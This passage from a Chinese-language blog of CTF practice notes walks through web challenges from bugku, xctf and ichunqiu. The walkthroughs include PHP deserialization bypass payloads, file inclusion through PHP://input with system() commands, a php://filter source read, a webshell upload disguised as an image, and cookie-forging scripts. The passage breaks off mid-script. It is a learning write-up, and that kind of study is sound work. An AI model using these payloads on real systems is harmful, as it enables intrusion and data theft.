&amp;&amp; $_COOKIE[<span class="hljs-string">'margin'</span>]==<span class="hljs-string">'margin'</span>)&#123;</span><span class="php">$file_list[<span class="hljs-number">2</span>]=<span class="hljs-string">'keys.php'</span>;</span><span class="php">&#125;</span><span class="php"><span class="hljs-keyword">if</span>(in_array($file,  $file_list))&#123;</span><span class="php">$fa =  file($file);</span><span class="php"><span class="hljs-keyword">echo</span> $fa[$line];</span><span class="php">&#125;</span><span class="php"><span class="hljs-meta">?&gt;</span></span></code></pre><br>cookie加上margin，filename换成keys.php的编码结果，line改成0就得到flag</p><hr><p>never give up(bugku)<br>点进去后发现有个明显的重定向到bugku的主页，用bp抓包发现重定向，以及hello.php的response注释的1p.html，bp抓包发送得到<br><pre><code class="hljs perl">var Words =<span class="hljs-string">"%3Cscript%3Ewindow.location.href%3D%27http%3A//www.bugku.com%27%3B%3C/script%3E%20%0A%3C%21--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ%3D%3D--%3E"</span> function OutWord()&#123;var NewWords;NewWords = unescape(Words);document.write(NewWords);&#125; OutWord();</code></pre><br>words内容url编码，解码得<br><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-built_in">window</span>.location.href=<span class="hljs-string">'http://www.bugku.com'</span>;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span> <span class="hljs-comment">&lt;!--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ==--&gt;</span></code></pre><br>注释中内容再base64解码+url解码得<br><pre><code class="hljs stata">";<span class="hljs-keyword">if</span>(!<span class="hljs-variable">$_GET</span>['id'])&#123;header('Location: hello.php?id=1');<span class="hljs-keyword">exit</span>();&#125;<span class="hljs-variable">$id</span>=<span class="hljs-variable">$_GET</span>['id'];<span class="hljs-variable">$a</span>=<span class="hljs-variable">$_GET</span>['a'];<span class="hljs-variable">$b</span>=<span class="hljs-variable">$_GET</span>['b'];<span class="hljs-keyword">if</span>(stripos(<span class="hljs-variable">$a</span>,'.'))&#123;echo '<span class="hljs-keyword">no</span> <span class="hljs-keyword">no</span> <span class="hljs-keyword">no</span> <span class="hljs-keyword">no</span> <span class="hljs-keyword">no</span> <span class="hljs-keyword">no</span> <span class="hljs-keyword">no</span>';<span class="hljs-keyword">return</span> ;&#125;<span class="hljs-variable">$data</span> = @file_get_contents(<span class="hljs-variable">$a</span>,'r');<span class="hljs-keyword">if</span>(<span class="hljs-variable">$data</span>==<span class="hljs-string">"bugku is a nice plateform!"</span> and <span class="hljs-variable">$id</span>==0 and <span class="hljs-built_in">strlen</span>(<span class="hljs-variable">$b</span>)&gt;5 and eregi(<span class="hljs-string">"111"</span>.<span class="hljs-built_in">substr</span>(<span class="hljs-variable">$b</span>,0,1),<span class="hljs-string">"1114"</span>) and <span class="hljs-built_in">substr</span>(<span class="hljs-variable">$b</span>,0,1)!=4)&#123;require(<span class="hljs-string">"f4l2a3g.txt"</span>);&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-keyword">print</span> <span class="hljs-string">"never never never give up !!!"</span>;&#125;?&gt;</code></pre><br><del>已经得到了flag存放得目录</del><br>接下来是php黑魔法</p><blockquote><p><a href="https://skysec.top/2017/07/22/PHP%E5%87%BD%E6%95%B0%E9%BB%91%E9%AD%94%E6%B3%95%E5%B0%8F%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">https://skysec.top/2017/07/22/PHP%E5%87%BD%E6%95%B0%E9%BB%91%E9%AD%94%E6%B3%95%E5%B0%8F%E6%80%BB%E7%BB%93/</a></p></blockquote><p>a,b,id都需要绕过检查：</p><ul><li>id: id==0且id不能为0，id设为字符串即可</li><li>b:  字符串长度大于5，利用eregi匹配漏洞：参数中的正则表达式或待匹配字符串遇到空字符则截断丢弃后面的数据。b用空字符开头即可(注意设置url payload时要用%00，解码后就是空字符)</li><li>a: 内容为bugku is a nice plateform!并且要是数据流，所以a=php://input传输入流即可</li></ul><p><img src="/2020/09/10/20-09-10/Inked%E6%89%B9%E6%B3%A8%202020-09-10%20202551_LI.jpg?v=1&amp;type=image" srcset="/img/loading.gif" alt="输入图片描述"></p><hr><p>过狗一句话(bugku)<br>被删库了。。。<br>查询php目录：print_r(scandir($dir))</p><hr><p>字符？正则？<br>匹配代码如下<br><pre><code class="hljs xml"><span class="php"><span class="hljs-meta">&lt;?php</span>  </span><span class="php">highlight_file(<span class="hljs-string">'2.php'</span>);  </span><span class="php">$key=<span class="hljs-string">'KEY&#123;********************************&#125;'</span>;  </span><span class="php">$IM= preg_match(<span class="hljs-string">"/key.*key.&#123;4,7&#125;key:\/.\/(.*key)[a-z][[:punct:]]/i"</span>, trim($_GET[<span class="hljs-string">"id"</span>]), $match);  </span><span class="php"><span class="hljs-keyword">if</span>( $IM )&#123;  </span><span class="php"><span class="hljs-keyword">die</span>(<span class="hljs-string">'key is: '</span>.$key);  </span><span class="php">&#125;  </span><span class="php"><span class="hljs-meta">?&gt;</span></span></code></pre><br>[[:punct:]]匹配标点符号<br>构造payload即可</p>]]></content>
    
    
    <categories>
      
      <category>ctf刷题笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>20.09.09</title>
    <link href="/2020/09/09/20-09-09/"/>
    <url>/2020/09/09/20-09-09/</url>
    
    <content type="html"><![CDATA[<p>一直把python当成工具库用，好像这思想不太对啊。。。。</p><hr><p>秋名山老司机(bugku)<br><img src="/2020/09/09/20-09-09/image.png?v=1&amp;type=image" srcset="/img/loading.gif" alt><br>看源码没发现啥，刷新界面后发现<br><img src="/2020/09/09/20-09-09/image.png?v=1&amp;type=image" srcset="/img/loading.gif" alt><br>应该是要在快速计算表达式并且提交。拿python 写脚本。<br><pre><code class="hljs pgsql"><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> reurl =  <span class="hljs-string">'http://123.206.87.240:8002/qiumingshan/'</span>s = requests.<span class="hljs-keyword">session</span>()response=s.<span class="hljs-keyword">get</span>(url)response.encoding =  <span class="hljs-string">'utf-8'</span>div=re.<span class="hljs-keyword">search</span>(<span class="hljs-string">'&lt;div&gt;(.*?)=.*?&lt;/div&gt;'</span>,response.text,re.S)cal = div.<span class="hljs-keyword">group</span>(<span class="hljs-number">1</span>)ans =  eval(cal)data=&#123;<span class="hljs-string">'value'</span>:ans&#125;r = s.post(url,data=data)print(r.text)</code></pre><br>通过session建立会话。</p><hr><p>速度要快（bugku）<br>python base64好难用好难用 : )<br>起初界面就说要快一点，查看源码是要提交margin（还以为是交css的margin属性，唉），真的傻乎乎交了margin看到让你快点，写脚本提交还是没有用。（这个人是有多蠢）<br>查看请求头和响应头发现有base64编码的flag（？？），解码后是一堆看不懂得乱码+’:’+字母。且发现每次下发得flag不一样。<br>考虑margin的值就是那串字母，继续写脚本，发现base64的b64decode会把str类型变成bytes，但是split需要str，上网搜索发现函数decode:<br><code>str=bytes.decode()</code><br>解决数据类型的问题后运行脚本还是要我快一点。崩溃<br>一通喝茶后发现flag是二次base64编码（？？？），幸福的连续两场b64decode结果python报错（fu*k）：</p><blockquote><p>UnicodeDecodeError: ‘utf-8’ codec can’t decode byte 0xa0 in position<br>2: invalid start byte</p></blockquote><p>把截取后的那串字母base64解码才成功，得到一串数字。改完后成功得到结果</p><p><del>实在是没有全面系统的学过python，当时简单学过基础语法后就去倒腾爬虫了，结果现在看官方技术文档都累，知识层面还得加强</del></p>]]></content>
    
    
    <categories>
      
      <category>ctf刷题笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>20.09.08(写记录好麻烦)</title>
    <link href="/2020/09/08/20-09-08-%E5%86%99%E8%AE%B0%E5%BD%95%E5%A5%BD%E9%BA%BB%E7%83%A6/"/>
    <url>/2020/09/08/20-09-08-%E5%86%99%E8%AE%B0%E5%BD%95%E5%A5%BD%E9%BA%BB%E7%83%A6/</url>
    
    <content type="html"><![CDATA[<p>是懒得写笔记以及成功使用菜刀的一天，检查的时候也顺便检查了一下一直在用的burpsuit的MD5（网站上下的一直懒得检查。。）<br><code>cmd下检查文件MD5: certitul -hashfile [filename] MD5</code></p><hr><p>upload1(攻防世界/xctf)<br>文件上传表单，随便交了个文件后显示选择图片上传。<br>一句话木马，文件后缀改成jpg，bp拦包修改回php后显示了文件传到的地址，尝试进upload没权限，用菜刀连接，找到flag.php就好了。</p><hr><p>do you know upload(i春秋)<br>又是只能传图片格式，依然是bp拦包修改上传，菜刀连接。<br>没有找到flag，但是在config.php找到数据库信息，连接数据库<br><img src="/2020/09/08/20-09-08-%E5%86%99%E8%AE%B0%E5%BD%95%E5%A5%BD%E9%BA%BB%E7%83%A6/image.png?v=1&amp;type=image" srcset="/img/loading.gif" alt><br>找到flag</p>]]></content>
    
    
    <categories>
      
      <category>ctf刷题笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>xctf20.9.07</title>
    <link href="/2020/09/07/xctf20-9-07/"/>
    <url>/2020/09/07/xctf20-9-07/</url>
    
    <content type="html"><![CDATA[<p>接触php序列化的一天。。</p><hr><p>web php unserialiaze<br>进去就看到php代码<br><pre><code class="hljs xml"><span class="php"><span class="hljs-meta">&lt;?php</span>  </span><span class="php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo</span> </span>&#123;  </span><span class="php"><span class="hljs-keyword">private</span> $file = <span class="hljs-string">'index.php'</span>;  </span><span class="php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($file)</span> </span>&#123;  </span><span class="php"><span class="hljs-keyword">$this</span>-&gt;file = $file;  </span><span class="php">&#125;  </span><span class="php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span><span class="hljs-params">()</span> </span>&#123;  </span><span class="php"><span class="hljs-keyword">echo</span> @highlight_file(<span class="hljs-keyword">$this</span>-&gt;file, <span class="hljs-keyword">true</span>);  </span><span class="php">&#125;  </span><span class="php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span><span class="hljs-params">()</span> </span>&#123;  </span><span class="php"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;file != <span class="hljs-string">'index.php'</span>) &#123;  </span><span class="php"><span class="hljs-comment">//the secret is in the fl4g.php  </span></span><span class="php"><span class="hljs-keyword">$this</span>-&gt;file = <span class="hljs-string">'index.php'</span>;  </span><span class="php">&#125;  </span><span class="php">&#125;  </span><span class="php">&#125;  </span><span class="php"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'var'</span>])) &#123;  </span><span class="php">$var = base64_decode($_GET[<span class="hljs-string">'var'</span>]);  </span><span class="php"><span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">'/[oc]:\d+:/i'</span>, $var)) &#123;  </span><span class="php"><span class="hljs-keyword">die</span>(<span class="hljs-string">'stop hacking!'</span>);  </span><span class="php">&#125; <span class="hljs-keyword">else</span> &#123;  </span><span class="php">@unserialize($var);  </span><span class="php">&#125;  </span><span class="php">&#125; <span class="hljs-keyword">else</span> &#123;  </span><span class="php">highlight_file(<span class="hljs-string">"index.php"</span>);  </span><span class="php">&#125;  </span><span class="php"><span class="hljs-meta">?&gt;</span></span></code></pre><br>大致思路就是传$file是fl4g.php的Demo类给var，但是需要注意避开preg_match以及魔法函数__warkup()（在unserialize时起作用）的过滤。</p><pre><code class="hljs xml"><span class="php"><span class="hljs-meta">&lt;?php</span></span><span class="php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo</span> </span>&#123; </span><span class="php">    <span class="hljs-keyword">private</span> $file = <span class="hljs-string">'index.php'</span>;</span><span class="php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($file)</span> </span>&#123; </span><span class="php">        <span class="hljs-keyword">$this</span>-&gt;file = $file; </span><span class="php">    &#125;</span><span class="php">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span><span class="hljs-params">()</span> </span>&#123; </span><span class="php">        <span class="hljs-keyword">echo</span> @highlight_file(<span class="hljs-keyword">$this</span>-&gt;file, <span class="hljs-keyword">true</span>); </span><span class="php">    &#125;</span><span class="php">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span><span class="hljs-params">()</span> </span>&#123; </span><span class="php">        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;file != <span class="hljs-string">'index.php'</span>) &#123; </span><span class="php">            <span class="hljs-comment">//the secret is in the fl4g.php</span></span><span class="php">            <span class="hljs-keyword">$this</span>-&gt;file = <span class="hljs-string">'index.php'</span>; </span><span class="php">        &#125; </span><span class="php">    &#125; </span><span class="php">&#125;</span><span class="php">$A= <span class="hljs-keyword">new</span> Demo(<span class="hljs-string">'fl4g.php'</span>);</span><span class="php">$B = serialize($A);</span><span class="php">$B = str_replace(<span class="hljs-string">':1:'</span>,<span class="hljs-string">':2:'</span>,$B);<span class="hljs-comment">//绕过wakeup</span></span><span class="php">$B = str_replace(<span class="hljs-string">'O:4'</span>,<span class="hljs-string">'O:+4'</span>,$B);<span class="hljs-comment">//+4绕过/d+的匹配</span></span><span class="php">$B = base64_encode($B);</span><span class="php"><span class="hljs-keyword">echo</span> $B;</span><span class="php"><span class="hljs-meta">?&gt;</span></span></code></pre><p>关于php反序列化漏洞：<a href="https://www.guildhab.top/?p=129" target="_blank" rel="noopener">https://www.guildhab.top/?p=129</a></p><hr><p>unserialize<br>还是反序列化，进去后页面上的代码如下<br><pre><code class="hljs awk">class xctf&#123;  public <span class="hljs-variable">$flag</span> = <span class="hljs-string">'111'</span>;  public <span class="hljs-keyword">function</span> __wakeup()&#123;  <span class="hljs-keyword">exit</span>(<span class="hljs-string">'bad requests'</span>);  &#125;  ?code=</code></pre><br>绕过<strong>wakeup()即可<br>自己构造?code=o:4:”xctf”:2:{s:4:”flag”;s:3:”111”}（本来是:1:，改成2后属性检查不通过就不触发</strong>wakeup()函数）<br>或者是写php脚本<br><pre><code class="hljs xml"><span class="php"><span class="hljs-meta">&lt;?php</span></span><span class="php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">xctf</span></span>&#123;</span><span class="php"><span class="hljs-keyword">public</span> $flag = <span class="hljs-string">'111'</span>;</span><span class="php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span><span class="hljs-params">()</span></span>&#123;</span><span class="php"><span class="hljs-keyword">exit</span>(<span class="hljs-string">'bad requests'</span>);</span><span class="php">&#125;</span><span class="php">&#125;</span><span class="php">$a = <span class="hljs-keyword">new</span> xctf();</span><span class="php">$ans=serialize($a);</span><span class="php"><span class="hljs-keyword">echo</span> $ans;</span><span class="php"><span class="hljs-meta">?&gt;</span></span></code></pre><br>Web_php_include<br>进去后看到代码<br><pre><code class="hljs xml"><span class="php"><span class="hljs-meta">&lt;?php</span>  </span><span class="php">show_source(<span class="hljs-keyword">__FILE__</span>);  </span><span class="php"><span class="hljs-keyword">echo</span> $_GET[<span class="hljs-string">'hello'</span>];  </span><span class="php">$page=$_GET[<span class="hljs-string">'page'</span>];  </span><span class="php"><span class="hljs-keyword">while</span> (strstr($page, <span class="hljs-string">"php://"</span>)) &#123;  </span><span class="php">$page=str_replace(<span class="hljs-string">"php://"</span>, <span class="hljs-string">""</span>, $page);  </span><span class="php">&#125;  </span><span class="php"><span class="hljs-keyword">include</span>($page);  </span><span class="php"><span class="hljs-meta">?&gt;</span></span></code></pre><br>过滤php://，大写绕过，想到文件包含漏洞<br>进入?page=PHP://input<br>POST传数据<code>&lt;?php system(&#39;ls&#39;); ?&gt;</code>，注意用burpsuit post传参时代码和请求头隔一行<br><img src="/2020/09/07/xctf20-9-07/%E6%89%B9%E6%B3%A8%202020-09-07%20121651.jpg?v=1&amp;type=image" srcset="/img/loading.gif" alt="输入图片描述"><br>得到fl4gisisish3r3.php，index.php，phpinfo.php三个文件<br>再传参<code>&lt;?php system(&#39;cat fl4gisisish3r3.php&#39;);?&gt;</code> 得到flag<br>或者?page=PHP://filter/read=convert.base64-encode/resource=fl4gisisish3r3.php</p><hr><p>web2<br>根据代码写出解密代码就可以了。<br><pre><code class="hljs xml"><span class="php"><span class="hljs-meta">&lt;?php</span></span><span class="php">$miwen=<span class="hljs-string">"a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws"</span>;</span><span class="php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">decode</span><span class="hljs-params">($_)</span></span>&#123;</span><span class="php">$_=base64_decode(strrev(str_rot13($_)));</span><span class="php"><span class="hljs-keyword">for</span>($_0=<span class="hljs-number">0</span>;$_0&lt;strlen($_);$_0++)&#123;</span><span class="php">    $_c=substr($_,$_0,<span class="hljs-number">1</span>);</span><span class="php">    $c=ord($_c)<span class="hljs-number">-1</span>;</span><span class="php">    $_c=chr($c);</span><span class="php">    $_o=$_o.$_c;</span><span class="php">&#125;</span><span class="php"><span class="hljs-keyword">echo</span> strrev($_o);</span><span class="php">&#125;</span><span class="php">decode($miwen);</span><span class="php"><span class="hljs-meta">?&gt;</span></span></code></pre></p><hr><p>php2<br>进去就一句话<br><img src="/2020/09/07/xctf20-9-07/image.png?v=1&amp;type=image" srcset="/img/loading.gif" alt><br>结果捣鼓半天完全没有头绪。<br>看wp是index.phps（完全想不到。。。）<br>然后就是根据代码构造id了</p>]]></content>
    
    
    <categories>
      
      <category>ctf刷题笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>百度杯九月场code-20.09.06</title>
    <link href="/2020/09/06/%E7%99%BE%E5%BA%A6%E6%9D%AF%E4%B9%9D%E6%9C%88%E5%9C%BAcode/"/>
    <url>/2020/09/06/%E7%99%BE%E5%BA%A6%E6%9D%AF%E4%B9%9D%E6%9C%88%E5%9C%BAcode/</url>
    
    <content type="html"><![CDATA[<p>Code(ichunqiu)<br>点开链接只有一张图片，查看源码发现file:hei.jpg以及图片源码的base64编码串，解码没有作用，标题的提示应该是访问jpg的内容，改成1.jpg等显示没有资源的图片。改询问?jpg=index.php，图片链接里又发现base64编码，解码得到：<br><pre><code class="hljs xml"><span class="php"><span class="hljs-meta">&lt;?php</span></span>/** * Created by PhpStorm. * Date: 2015/11/16 * Time: 1:31<span class="php"> */</span><span class="php">header(<span class="hljs-string">'content-type:text/html;charset=utf-8'</span>);</span><span class="php"><span class="hljs-keyword">if</span>(! <span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'jpg'</span>]))</span><span class="php">    header(<span class="hljs-string">'Refresh:0;url=./index.php?jpg=hei.jpg'</span>);</span><span class="php">$file = $_GET[<span class="hljs-string">'jpg'</span>];</span><span class="php"><span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;title&gt;file:'</span>.$file.<span class="hljs-string">'&lt;/title&gt;'</span>;</span><span class="php">$file = preg_replace(<span class="hljs-string">"/[^a-zA-Z0-9.]+/"</span>,<span class="hljs-string">""</span>, $file);</span><span class="php">$file = str_replace(<span class="hljs-string">"config"</span>,<span class="hljs-string">"_"</span>, $file);</span><span class="php">$txt = base64_encode(file_get_contents($file));</span><span class="php"><span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;img src='data:image/gif;base64,"</span>.$txt.<span class="hljs-string">"'&gt;&lt;/img&gt;"</span>;</span>/* * Can you find the flag file? *<span class="php"> */</span><span class="php"><span class="hljs-meta">?&gt;</span></span></code></pre><br>知道了过滤方法依然不知道flag在哪。。<br>看题解发现提示在注释里，”created by Phpstorm”，(感觉自己啥也不知道: )  )</p><blockquote><p>phpstorm是php代码的集成开发环境，下载phpstorm，并新建一个项目，会发现在项目文件夹里面会生成一个.idea文件，它存储了项目的配置文件，</p><p>打开.idea文件可以发现misc.xml,modules.xml,workspace.xml文件。</p></blockquote><p>进入.idea/workspace.xml发现有config.php以及fl3g_ichuqiu.php，进config.php发现啥也没有，再进fl3g_ichuqiu.php发现╮(╯▽╰)╭暂时也没什么用。<br>想到之前得到的php代码，尝试访问index.php?jpg=fl3gconfigichuqiu.php，得到又一串base64编码，解码得：<br><pre><code class="hljs xml"><span class="php"><span class="hljs-meta">&lt;?php</span></span>/** * Created by PhpStorm. * Date: 2015/11/16 * Time: 1:31<span class="php"> */</span><span class="php">error_reporting(E_ALL || ~E_NOTICE);</span><span class="php"><span class="hljs-keyword">include</span>(<span class="hljs-string">'config.php'</span>);</span><span class="php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">random</span><span class="hljs-params">($length, $chars = <span class="hljs-string">'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz'</span>)</span> </span>&#123;</span><span class="php">    $hash = <span class="hljs-string">''</span>;</span><span class="php">    $max = strlen($chars) - <span class="hljs-number">1</span>;</span><span class="php">    <span class="hljs-keyword">for</span>($i = <span class="hljs-number">0</span>; $i &lt; $length; $i++)&#123;</span><span class="php">        $hash .= $chars[mt_rand(<span class="hljs-number">0</span>, $max)];</span><span class="php">    &#125;</span><span class="php">    <span class="hljs-keyword">return</span> $hash;</span><span class="php">&#125;</span><span class="php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">encrypt</span><span class="hljs-params">($txt,$key)</span></span>&#123;</span><span class="php">    <span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>;$i&lt;strlen($txt);$i++)&#123;</span><span class="php">        $tmp .= chr(ord($txt[$i])+<span class="hljs-number">10</span>);</span><span class="php">    &#125;</span><span class="php">    $txt = $tmp;</span><span class="php">    $rnd=random(<span class="hljs-number">4</span>);</span><span class="php">    $key=md5($rnd.$key);</span><span class="php">    $s=<span class="hljs-number">0</span>;</span><span class="php">    <span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>;$i&lt;strlen($txt);$i++)&#123;</span><span class="php">        <span class="hljs-keyword">if</span>($s == <span class="hljs-number">32</span>) $s = <span class="hljs-number">0</span>;</span><span class="php">        $ttmp .= $txt[$i] ^ $key[++$s];</span><span class="php">    &#125;</span><span class="php">    <span class="hljs-keyword">return</span> base64_encode($rnd.$ttmp);</span><span class="php">&#125;</span><span class="php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">decrypt</span><span class="hljs-params">($txt,$key)</span></span>&#123;</span><span class="php">    $txt=base64_decode($txt);</span><span class="php">    $rnd = substr($txt,<span class="hljs-number">0</span>,<span class="hljs-number">4</span>);</span><span class="php">    $txt = substr($txt,<span class="hljs-number">4</span>);</span><span class="php">    $key=md5($rnd.$key);</span><span class="php">    $s=<span class="hljs-number">0</span>;</span><span class="php">    <span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>;$i&lt;strlen($txt);$i++)&#123;</span><span class="php">        <span class="hljs-keyword">if</span>($s == <span class="hljs-number">32</span>) $s = <span class="hljs-number">0</span>;</span><span class="php">        $tmp .= $txt[$i]^$key[++$s];</span><span class="php">    &#125;</span><span class="php">    <span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>;$i&lt;strlen($tmp);$i++)&#123;</span><span class="php">        $tmp1 .= chr(ord($tmp[$i])<span class="hljs-number">-10</span>);</span><span class="php">    &#125;</span><span class="php">    <span class="hljs-keyword">return</span> $tmp1;</span><span class="php">&#125;</span><span class="php">$username = decrypt($_COOKIE[<span class="hljs-string">'user'</span>],$key);</span><span class="php"><span class="hljs-keyword">if</span> ($username == <span class="hljs-string">'system'</span>)&#123;</span><span class="php">    <span class="hljs-keyword">echo</span> $flag;</span><span class="php">&#125;<span class="hljs-keyword">else</span>&#123;</span><span class="php">    setcookie(<span class="hljs-string">'user'</span>,encrypt(<span class="hljs-string">'guest'</span>,$key));</span><span class="php">    <span class="hljs-keyword">echo</span> <span class="hljs-string">"­╮(╯▽╰)╭"</span>;</span><span class="php">&#125;</span><span class="php"><span class="hljs-meta">?&gt;</span></span></code></pre><br>先进输出╮(╯▽╰)╭得网页得到cookie，根据encrypt以及decrypt解出需要得cookie值<br><pre><code class="hljs perl">//要得到flag需要username=<span class="hljs-string">'system'</span>，就需要cookie[<span class="hljs-string">'user'</span>]和key解密得到//username不是<span class="hljs-string">'system'</span>时cookie[<span class="hljs-string">'user'</span>]由<span class="hljs-string">'guest'</span>和key加密得到，根据此可以得到五位key//爆破最后一位key得到第六位即可得到需要的cookie[<span class="hljs-string">'user'</span>]&lt;?phpfunction getAns($txt,$cookie)&#123;    <span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>;$i&lt;strlen($txt);$i++)&#123;        $tmp.=<span class="hljs-keyword">chr</span>(<span class="hljs-keyword">ord</span>($txt[$i])+<span class="hljs-number">10</span>);    &#125;    $txt = $tmp;    $cookie = base64_decode($cookie);    $rnd=<span class="hljs-keyword">substr</span>($cookie,<span class="hljs-number">0</span>,<span class="hljs-number">4</span>);    $ttmp=<span class="hljs-keyword">substr</span>($cookie,<span class="hljs-number">4</span>);    $s=<span class="hljs-number">0</span>;    <span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>;$i&lt;strlen($ttmp);$i++)&#123;        $key.=$ttmp[$i]^$txt[$i];    &#125;    $tmp1=<span class="hljs-string">'system'</span>;    $tmp=<span class="hljs-string">''</span>;    <span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>;$i&lt;strlen($tmp1);$i++)&#123;        $tmp.=<span class="hljs-keyword">chr</span>(<span class="hljs-keyword">ord</span>($tmp1[$i])+<span class="hljs-number">10</span>);    &#125;    $dir=<span class="hljs-string">'0123456789abcdef'</span>;    <span class="hljs-keyword">for</span>($i=<span 